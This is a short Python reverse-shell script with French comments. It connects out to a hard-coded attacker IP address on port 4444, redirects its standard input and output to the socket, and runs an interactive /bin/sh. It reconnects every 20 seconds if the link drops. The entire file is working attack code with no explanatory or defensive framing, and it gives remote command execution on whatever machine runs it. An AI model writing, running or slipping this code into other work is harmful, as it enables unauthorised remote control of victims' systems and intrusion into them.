import socket
import subprocess
import os
import time

# --- CONFIGURATION ---
ATTACKER_IP = "77.207.25.30" 
PORT = 4444

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, PORT))
            
            # Rediriger stdin, stdout, stderr vers la socket
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)

            # Lancement du shell interactif
            # C'est ce shell qui répondra aux commandes envoyées par le serveur
            subprocess.call(["/bin/sh", "-i"])
        except Exception:
            time.sleep(20) # Reconnexion auto
            continue
        finally:
            s.close()

if __name__ == "__main__":
    connect()
